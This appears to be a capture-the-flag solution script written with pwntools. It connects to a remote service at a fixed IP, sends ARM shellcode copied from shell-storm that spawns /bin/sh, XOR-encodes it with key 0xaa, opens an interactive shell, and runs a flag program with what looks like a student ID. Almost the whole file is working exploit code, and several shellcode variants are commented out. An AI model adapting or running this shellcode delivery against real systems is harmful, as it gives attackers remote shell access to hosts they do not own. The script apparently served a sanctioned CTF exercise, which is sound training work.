from pwn import *

context.log_level = 'DEBUG'

conn = remote("47.99.80.189", 10001)
conn.recvuntil("give me something to get shell!\r\r\n")


# http://shell-storm.org/shellcode/files/shellcode-696.php
# shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
# shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf/bin/sh"
# shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf/bin/shell"

# http://shell-storm.org/shellcode/files/shellcode-904.php
# shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68";
# shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf/bin//sh";
# shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf/bin/shell";

# http://shell-storm.org/shellcode/files/shellcode-698.php
shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68";
shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf/bin/sh";
shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf/bin/shell";

key = 0xaa
shellcode_xor = b""

for i in shellcode:
    # log.debug(hex(i), hex(i ^ key), (i ^ key).to_bytes(1, 'little'))
    shellcode_xor += (i ^ key).to_bytes(1, 'little')

conn.sendline(shellcode_xor)
conn.interactive()


conn.recv()
# log.info()
conn.sendline(b'cd /etc')
conn.recv()
conn.sendline(b'./flag.exe 3180103012')
conn.recv()